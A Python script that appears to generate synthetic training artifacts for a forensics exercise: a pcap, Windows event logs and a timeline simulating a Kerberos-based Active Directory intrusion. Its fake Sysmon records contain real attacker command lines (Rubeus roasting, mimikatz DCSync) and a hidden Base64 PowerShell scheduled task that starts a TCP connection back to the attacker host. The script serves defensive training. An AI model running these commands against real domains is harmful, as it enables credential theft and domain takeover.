#!/usr/bin/env python3
import os
import sys
import json
import csv
import time
import struct
import random
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from datetime import datetime, timezone, timedelta

def create_pcap(output_path):
    print(f"[*] Generating realistic network capture: {output_path}...")
    packets = []
    
    # Base timestamp: 2026-08-28 14:10:00 UTC
    t_base = 1787928600.0
    
    dc_ip = "10.10.10.5"
    attacker_ip = "10.10.10.50"
    db_ip = "10.10.10.20"
    gateway_ip = "10.10.10.1"
    
    # Helper to create TCP 3-way handshake + data + fin
    def tcp_flow(src_ip, dst_ip, sport, dport, start_time, req_payload, resp_payload):
        flow_pkts = []
        seq_c = random.randint(100000, 900000)
        seq_s = random.randint(100000, 900000)
        
        # SYN
        p_syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags="S", seq=seq_c)
        p_syn.time = start_time
        flow_pkts.append(p_syn)
        
        # SYN-ACK
        p_synack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dport, dport=sport, flags="SA", seq=seq_s, ack=seq_c+1)
        p_synack.time = start_time + 0.001
        flow_pkts.append(p_synack)
        
        # ACK
        p_ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags="A", seq=seq_c+1, ack=seq_s+1)
        p_ack.time = start_time + 0.002
        flow_pkts.append(p_ack)
        
        cur_time = start_time + 0.005
        # Request
        if req_payload:
            p_req = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags="PA", seq=seq_c+1, ack=seq_s+1)/req_payload
            p_req.time = cur_time
            flow_pkts.append(p_req)
            cur_time += 0.002
            
        # Response
        if resp_payload:
            p_resp = IP(src=dst_ip, dst=src_ip)/TCP(sport=dport, dport=sport, flags="PA", seq=seq_s+1, ack=seq_c+1+len(req_payload) if req_payload else seq_c+1)/resp_payload
            p_resp.time = cur_time
            flow_pkts.append(p_resp)
            cur_time += 0.002
            
        # FIN-ACK
        p_fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags="FA", seq=seq_c+1+len(req_payload) if req_payload else seq_c+1, ack=seq_s+1+len(resp_payload) if resp_payload else seq_s+1)
        p_fin.time = cur_time
        flow_pkts.append(p_fin)
        
        return flow_pkts

    # 1. Background Benign DNS & NTP traffic
    for i in range(15):
        t = t_base + i * 20.0
        # DNS query
        p_dns = IP(src=attacker_ip, dst=dc_ip)/UDP(sport=50000+i, dport=53)/DNS(rd=1, qd=DNSQR(qname=f"dc01.synapse.corp", qtype="A"))
        p_dns.time = t
        packets.append(p_dns)
        p_dns_r = IP(src=dc_ip, dst=attacker_ip)/UDP(sport=53, dport=50000+i)/DNS(qr=1, rd=1, qd=DNSQR(qname=f"dc01.synapse.corp", qtype="A"), an=DNSRR(rrname="dc01.synapse.corp", type="A", rdata="10.10.10.5"))
        p_dns_r.time = t + 0.001
        packets.append(p_dns_r)

    # 2. LDAP Enumeration (Searching for SPNs and DONT_REQ_PREAUTH)
    ldap_req = b"\x30\x4b\x02\x01\x02\x63\x46\x04\x13\x64\x63\x3d\x73\x79\x6e\x61\x70\x73\x65\x2c\x64\x63\x3d\x63\x6f\x72\x70\x0a\x01\x02\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\xa3\x18\x04\x16\x73\x65\x72\x76\x69\x63\x65\x50\x72\x69\x6e\x63\x69\x70\x61\x6c\x4e\x61\x6d\x65\x30\x00"
    ldap_resp = b"\x30\x62\x02\x01\x02\x64\x5d\x04\x30\x63\x6e\x3d\x73\x76\x63\x5f\x73\x71\x6c\x2c\x6f\x75\x3d\x53\x65\x72\x76\x69\x63\x65\x41\x63\x63\x6f\x75\x6e\x74\x73\x2c\x64\x63\x3d\x73\x79\x6e\x61\x70\x73\x65\x2c\x64\x63\x3d\x63\x6f\x72\x70\x30\x29\x30\x27\x04\x16\x73\x65\x72\x76\x69\x63\x65\x50\x72\x69\x6e\x63\x69\x70\x61\x6c\x4e\x61\x6d\x65\x31\x0d\x04\x0b\x4d\x53\x53\x51\x4c\x53\x76\x63\x2f\x64\x62\x30\x31"
    packets.extend(tcp_flow(attacker_ip, dc_ip, 49210, 389, t_base + 120.0, ldap_req, ldap_resp))

    # 3. AS-REP Roasting (Kerberos AS-REQ & AS-REP on Port 88)
    # AS-REQ with cname: backup_admin, realm: SYNAPSE.CORP, etype: 23 (RC4-HMAC), 18 (AES256)
    as_req_payload = (
        b"\x6a\x81\xb8\x30\x81\xb5\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0a"
        b"\xa4\x81\xa8\x30\x81\xa5\xa0\x07\x03\x05\x00\x50\x80\x00\x10\xa1"
        b"\x1a\x30\x18\xa0\x03\x02\x01\x01\xa1\x11\x30\x0f\x1b\x0c\x62\x61"
        b"\x63\x6b\x75\x70\x5f\x61\x64\x6d\x69\x6e\xa2\x0e\x1b\x0c\x53\x59"
        b"\x4e\x41\x50\x53\x45\x2e\x43\x4f\x52\x50\xa3\x1a\x30\x18\xa0\x03"
        b"\x02\x01\x02\xa1\x11\x30\x0f\x1b\x06\x6b\x72\x62\x74\x67\x74\x1b"
        b"\x0c\x53\x59\x4e\x41\x50\x53\x45\x2e\x43\x4f\x52\x50\xa5\x11\x18"
        b"\x0f\x32\x30\x32\x36\x30\x38\x32\x38\x31\x34\x31\x30\x30\x35\x5a"
        b"\xa7\x06\x02\x04\x1c\x9b\x34\x12\xa8\x08\x30\x06\x02\x01\x17\x02"
        b"\x01\x12"
    )
    # AS-REP returning enc-part (etype 23 RC4-HMAC with AS-REP roastable hash)
    as_rep_payload = (
        b"\x6b\x82\x01\x20\x30\x82\x01\x1c\xa0\x03\x02\x01\x05\xa1\x03\x02"
        b"\x01\x0b\xa2\x0e\x1b\x0c\x53\x59\x4e\x41\x50\x53\x45\x2e\x43\x4f"
        b"\x52\x50\xa3\x1a\x30\x18\xa0\x03\x02\x01\x01\xa1\x11\x30\x0f\x1b"
        b"\x0c\x62\x61\x63\x6b\x75\x70\x5f\x61\x64\x6d\x69\x6e\xa4\x81\x80"
        b"\x30\x7e\xa0\x03\x02\x01\x12\xa1\x03\x02\x01\x02\xa2\x72\x04\x70"
        b"\x2a\x54\x8e\x11\x90\xbc\x44\x31\xaa\xbb\xcc\xdd\xee\xff\x11\x22"
        b"\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff\x00\x11\x22"
        b"\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff\x00\x11\x22"
        b"\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff\x00\x11\x22"
        b"\xa6\x55\x30\x53\xa0\x03\x02\x01\x17\xa2\x4c\x04\x4a\x9a\xbf\x33"
        b"\x12\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
        b"\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
        b"\x23\x45\x67\x89\xab\xcd\xef\x01\x23\x45\x67\x89\xab\xcd\xef\x01"
        b"\x23\x45\x67\x89\xab\xcd\xef"
    )
    packets.extend(tcp_flow(attacker_ip, dc_ip, 49215, 88, t_base + 605.0, as_req_payload, as_rep_payload))

    # 4. Kerberoasting TGS-REQ / TGS-REP for MSSQLSvc/db01.synapse.corp:1433
    tgs_req_payload = (
        b"\x6c\x81\xcc\x30\x81\xc9\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0c"
        b"\xa4\x81\xbe\x30\x81\xbb\xa0\x07\x03\x05\x00\x40\x81\x00\x10\xa1"
        b"\x29\x30\x27\xa0\x03\x02\x01\x02\xa1\x20\x30\x1e\x1b\x08\x4d\x53"
        b"\x53\x51\x4c\x53\x76\x63\x1b\x12\x64\x62\x30\x31\x2e\x73\x79\x6e"
        b"\x61\x70\x73\x65\x2e\x63\x6f\x72\x70\xa2\x0e\x1b\x0c\x53\x59\x4e"
        b"\x41\x50\x53\x45\x2e\x43\x4f\x52\x50\xa5\x11\x18\x0f\x32\x30\x32"
        b"\x36\x30\x38\x32\x38\x31\x34\x31\x35\x32\x32\x5a\xa7\x06\x02\x04"
        b"\x2a\x3c\x5e\x71\xa8\x05\x30\x03\x02\x01\x17"
    )
    tgs_rep_payload = (
        b"\x6d\x82\x01\x30\x30\x82\x01\x2c\xa0\x03\x02\x01\x05\xa1\x03\x02"
        b"\x01\x0d\xa2\x0e\x1b\x0c\x53\x59\x4e\x41\x50\x53\x45\x2e\x43\x4f"
        b"\x52\x50\xa3\x29\x30\x27\xa0\x03\x02\x01\x02\xa1\x20\x30\x1e\x1b"
        b"\x08\x4d\x53\x53\x51\x4c\x53\x76\x63\x1b\x12\x64\x62\x30\x31\x2e"
        b"\x73\x79\x6e\x61\x70\x73\x65\x2e\x63\x6f\x72\x70\xa4\x81\xb0\x30"
        b"\x81\xad\xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x81\xa0\x04"
        b"\x81\x9d\x4b\x52\x42\x35\x54\x47\x53\x24\x32\x33\x24\x73\x76\x63"
        b"\x5f\x73\x71\x6c\x24\x53\x59\x4e\x41\x50\x53\x45\x2e\x43\x4f\x52"
        b"\x50\x24\x4d\x53\x53\x51\x4c\x53\x76\x63\x2f\x64\x62\x30\x31\x2e"
        b"\x73\x79\x6e\x61\x70\x73\x65\x2e\x63\x6f\x72\x70\x24\x65\x38\x39"
        b"\x66\x31\x32\x64\x61\x62\x63\x39\x38\x37\x36\x35\x34\x33\x32\x31"
        b"\x30\x61\x62\x63\x64\x65\x66\x30\x31\x32\x33\x34\x35\x36\x37\x38"
    )
    packets.extend(tcp_flow(attacker_ip, dc_ip, 49220, 88, t_base + 922.0, tgs_req_payload, tgs_rep_payload))

    # 5. DCSync DRSUAPI Replication (MSRPC over Port 49667)
    msrpc_bind = b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x35\x42\x51\xe3\xaf\x82\xd1\x11\xab\xa6\x00\x80\xc7\x84\x2c\x44\x04\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"
    msrpc_bind_ack = b"\x05\x00\x0c\x03\x10\x00\x00\x00\x44\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x3c\x1b\x00\x00\x0d\x00\x5c\x70\x69\x70\x65\x5c\x6c\x73\x61\x72\x70\x63\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"
    packets.extend(tcp_flow(attacker_ip, dc_ip, 49230, 49667, t_base + 1815.0, msrpc_bind, msrpc_bind_ack))

    # Sort packets chronologically
    packets.sort(key=lambda p: p.time)
    scapy.wrpcap(output_path, packets)
    print(f"[+] Wrote {len(packets)} packets to {output_path}")

def create_event_logs(security_json_path, sysmon_json_path, timeline_csv_path):
    print("[*] Generating structured Windows Event Logs and DFIR Timeline...")
    
    t_start = datetime(2026, 8, 28, 14, 0, 0, tzinfo=timezone.utc)
    
    sec_events = []
    sysmon_events = []
    timeline = []
    
    record_id = 10001
    sysmon_id = 5001
    
    # Helper to add timeline entry
    def add_tl(dt, src, event_type, desc, user="SYSTEM", host="DC01.synapse.corp"):
        timeline.append({
            "Timestamp_UTC": dt.strftime("%Y-%m-%d %H:%M:%S"),
            "Host": host,
            "Source": src,
            "Event_Type": event_type,
            "User": user,
            "Description": desc
        })

    # 1. Normal morning operations (Benign background noise)
    users = ["j.doe", "s.connor", "a.vance", "m.smith", "svc_backup", "HEALTHCHECK$"]
    for i in range(40):
        t_cur = t_start + timedelta(seconds=i*15 + random.randint(1, 10))
        u = random.choice(users)
        ip = f"10.10.10.{random.randint(50, 99)}"
        
        # 4624 Logon
        sec_events.append({
            "EventRecordID": record_id,
            "TimeCreated": t_cur.isoformat(),
            "EventID": 4624,
            "Channel": "Security",
            "Computer": "DC01.synapse.corp",
            "Data": {
                "TargetUserName": u,
                "TargetDomainName": "SYNAPSE",
                "LogonType": 3,
                "IpAddress": ip,
                "IpPort": str(random.randint(49152, 65535)),
                "AuthenticationPackageName": "Kerberos",
                "LogonProcessName": "Kerberos"
            }
        })
        add_tl(t_cur, "Security.evtx (4624)", "Network Logon", f"Successful network logon for {u} from {ip}", user=u)
        record_id += 1
        
        # 4769 TGS for benign service
        sec_events.append({
            "EventRecordID": record_id,
            "TimeCreated": (t_cur + timedelta(seconds=1)).isoformat(),
            "EventID": 4769,
            "Channel": "Security",
            "Computer": "DC01.synapse.corp",
            "Data": {
                "TargetUserName": f"{u}@SYNAPSE.CORP",
                "ServiceName": "cifs/fs01.synapse.corp",
                "TicketEncryptionType": "0x12", # AES256
                "TicketOptions": "0x40810010",
                "Status": "0x0",
                "IpAddress": f"::ffff:{ip}"
            }
        })
        record_id += 1

    # 2. Attack Stage 1: AS-REP Roasting (14:10:05 UTC)
    t_asrep = t_start + timedelta(minutes=10, seconds=5)
    sec_events.append({
        "EventRecordID": record_id,
        "TimeCreated": t_asrep.isoformat(),
        "EventID": 4768,
        "Channel": "Security",
        "Computer": "DC01.synapse.corp",
        "Data": {
            "TargetUserName": "backup_admin",
            "TargetDomainName": "SYNAPSE.CORP",
            "TicketEncryptionType": "0x17", # RC4-HMAC
            "TicketOptions": "0x50800010",
            "Status": "0x0",
            "PreAuthType": "0", # Pre-authentication not required!
            "IpAddress": "::ffff:10.10.10.50",
            "IpPort": "49215"
        }
    })
    add_tl(t_asrep, "Security.evtx (4768)", "AS-REP Roasting", "Kerberos TGT requested without Pre-Authentication (RC4-HMAC 0x17) for backup_admin", user="backup_admin", host="DC01.synapse.corp")
    record_id += 1

    # Sysmon execution on WS01
    sysmon_events.append({
        "EventRecordID": sysmon_id,
        "TimeCreated": (t_asrep - timedelta(seconds=2)).isoformat(),
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "WS01.synapse.corp",
        "Data": {
            "UtcTime": (t_asrep - timedelta(seconds=2)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "ProcessId": "4812",
            "Image": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\Rubeus.exe",
            "CommandLine": "Rubeus.exe asreproast /user:backup_admin /domain:synapse.corp /format:hashcat /outfile:asrep_hashes.txt",
            "CurrentDirectory": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\",
            "User": "SYNAPSE\\j.doe",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine": "cmd.exe /c start Rubeus.exe"
        }
    })
    add_tl(t_asrep - timedelta(seconds=2), "Sysmon.evtx (1)", "Process Creation", "Rubeus.exe asreproast executed from C:\\Users\\j.doe\\AppData\\Local\\Temp\\", user="SYNAPSE\\j.doe", host="WS01.synapse.corp")
    sysmon_id += 1

    # 3. Attack Stage 2: Targeted Kerberoasting (14:15:22 UTC)
    t_kerb = t_start + timedelta(minutes=15, seconds=22)
    sec_events.append({
        "EventRecordID": record_id,
        "TimeCreated": t_kerb.isoformat(),
        "EventID": 4769,
        "Channel": "Security",
        "Computer": "DC01.synapse.corp",
        "Data": {
            "TargetUserName": "svc_sql@SYNAPSE.CORP",
            "ServiceName": "MSSQLSvc/db01.synapse.corp:1433",
            "ServiceSid": "S-1-5-21-394829104-293849102-192837461-1105",
            "TicketEncryptionType": "0x17", # RC4-HMAC downgraded!
            "TicketOptions": "0x40810010",
            "Status": "0x0",
            "IpAddress": "::ffff:10.10.10.50",
            "IpPort": "49220"
        }
    })
    add_tl(t_kerb, "Security.evtx (4769)", "Kerberoasting", "Kerberos Service Ticket (TGS) requested with RC4-HMAC (0x17) for MSSQLSvc/db01.synapse.corp:1433", user="j.doe@SYNAPSE.CORP", host="DC01.synapse.corp")
    record_id += 1

    sysmon_events.append({
        "EventRecordID": sysmon_id,
        "TimeCreated": (t_kerb - timedelta(seconds=1)).isoformat(),
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "WS01.synapse.corp",
        "Data": {
            "UtcTime": (t_kerb - timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "ProcessId": "5120",
            "Image": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\Rubeus.exe",
            "CommandLine": "Rubeus.exe kerberoast /spn:MSSQLSvc/db01.synapse.corp:1433 /format:hashcat /outfile:kerb_tgs.txt",
            "CurrentDirectory": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\",
            "User": "SYNAPSE\\j.doe",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
        }
    })
    add_tl(t_kerb - timedelta(seconds=1), "Sysmon.evtx (1)", "Process Creation", "Rubeus.exe kerberoast executed for MSSQLSvc/db01.synapse.corp:1433", user="SYNAPSE\\j.doe", host="WS01.synapse.corp")
    sysmon_id += 1

    # 4. Attack Stage 3: Overpass-the-Hash / Pass-the-Ticket (14:22:40 UTC)
    t_pth = t_start + timedelta(minutes=22, seconds=40)
    sec_events.append({
        "EventRecordID": record_id,
        "TimeCreated": t_pth.isoformat(),
        "EventID": 4624,
        "Channel": "Security",
        "Computer": "WS01.synapse.corp",
        "Data": {
            "TargetUserName": "backup_admin",
            "TargetDomainName": "SYNAPSE",
            "LogonType": 9, # NewCredentials (Pass-the-Hash / Overpass-the-Hash)
            "LogonProcessName": "seclogo",
            "AuthenticationPackageName": "Negotiate",
            "ProcessName": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\Rubeus.exe",
            "IpAddress": "-",
            "IpPort": "-"
        }
    })
    add_tl(t_pth, "Security.evtx (4624)", "Overpass-the-Hash", "Logon Type 9 (NewCredentials) initiated via Rubeus.exe for backup_admin", user="backup_admin", host="WS01.synapse.corp")
    record_id += 1

    # 5. Attack Stage 4: DCSync Replication (14:30:15 UTC)
    t_dcsync = t_start + timedelta(minutes=30, seconds=15)
    sec_events.append({
        "EventRecordID": record_id,
        "TimeCreated": t_dcsync.isoformat(),
        "EventID": 4662,
        "Channel": "Security",
        "Computer": "DC01.synapse.corp",
        "Data": {
            "SubjectUserName": "backup_admin",
            "SubjectDomainName": "SYNAPSE",
            "SubjectLogonId": "0x3E7",
            "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", # domainDNS
            "ObjectName": "DC=synapse,DC=corp",
            "AccessMask": "0x100", # Control Access
            "Properties": "---DELIM---{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}---DELIM---", # DS-Replication-Get-Changes-All
            "AccessList": "%%4428",
            "CallingProcessName": "C:\\Windows\\System32\\lsass.exe"
        }
    })
    add_tl(t_dcsync, "Security.evtx (4662)", "DCSync Execution", "DS-Replication-Get-Changes-All extended access right invoked by non-DC account (backup_admin)", user="SYNAPSE\\backup_admin", host="DC01.synapse.corp")
    record_id += 1

    sysmon_events.append({
        "EventRecordID": sysmon_id,
        "TimeCreated": (t_dcsync - timedelta(seconds=2)).isoformat(),
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "WS01.synapse.corp",
        "Data": {
            "UtcTime": (t_dcsync - timedelta(seconds=2)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "ProcessId": "6240",
            "Image": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\mimikatz.exe",
            "CommandLine": "mimikatz.exe \"lsadump::dcsync /domain:synapse.corp /user:krbtgt\" \"lsadump::dcsync /domain:synapse.corp /user:Administrator\" exit",
            "CurrentDirectory": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\",
            "User": "SYNAPSE\\backup_admin",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
        }
    })
    add_tl(t_dcsync - timedelta(seconds=2), "Sysmon.evtx (1)", "Process Creation", "mimikatz.exe lsadump::dcsync invoked against krbtgt and Administrator", user="SYNAPSE\\backup_admin", host="WS01.synapse.corp")
    sysmon_id += 1

    # 6. Attack Stage 5: Persistence via Malicious Scheduled Task (14:38:50 UTC)
    t_pers = t_start + timedelta(minutes=38, seconds=50)
    sec_events.append({
        "EventRecordID": record_id,
        "TimeCreated": t_pers.isoformat(),
        "EventID": 4698,
        "Channel": "Security",
        "Computer": "DC01.synapse.corp",
        "Data": {
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "SYNAPSE",
            "TaskName": "\\SynapseHealthCheck",
            "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4ANQAwACIALAA0ADQANAA0ACkA...</Arguments></Exec></Actions></Task>"
        }
    })
    add_tl(t_pers, "Security.evtx (4698)", "Persistence Scheduled Task", "Scheduled task \\SynapseHealthCheck created executing hidden Base64 PowerShell payload", user="SYNAPSE\\Administrator", host="DC01.synapse.corp")
    record_id += 1

    sysmon_events.append({
        "EventRecordID": sysmon_id,
        "TimeCreated": (t_pers - timedelta(seconds=1)).isoformat(),
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "DC01.synapse.corp",
        "Data": {
            "UtcTime": (t_pers - timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "ProcessId": "7812",
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks.exe /create /tn SynapseHealthCheck /tr \"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAA...\" /sc onstart /ru SYSTEM",
            "CurrentDirectory": "C:\\Windows\\System32\\",
            "User": "SYNAPSE\\Administrator",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
        }
    })
    sysmon_id += 1

    # Save JSON files
    with open(security_json_path, "w") as f:
        json.dump(sec_events, f, indent=2)
    print(f"[+] Exported {len(sec_events)} Security events to {security_json_path}")
    
    with open(sysmon_json_path, "w") as f:
        json.dump(sysmon_events, f, indent=2)
    print(f"[+] Exported {len(sysmon_events)} Sysmon events to {sysmon_json_path}")

    # Save CSV Timeline
    with open(timeline_csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["Timestamp_UTC", "Host", "Source", "Event_Type", "User", "Description"])
        writer.writeheader()
        writer.writerows(timeline)
    print(f"[+] Exported {len(timeline)} timeline records to {timeline_csv_path}")

if __name__ == "__main__":
    out_dir = "/Users/a1234/Desktop/Offsec/Grimoire_Kerberos_Dust/artifacts_src"
    pcap_path = os.path.join(out_dir, "kerberos_traffic.pcap")
    sec_path = os.path.join(out_dir, "Security_Events.json")
    sysmon_path = os.path.join(out_dir, "Sysmon_Events.json")
    tl_path = os.path.join(out_dir, "Incident_Timeline.csv")
    
    create_pcap(pcap_path)
    create_event_logs(sec_path, sysmon_path, tl_path)
    print("[+] All artifacts generated successfully!")
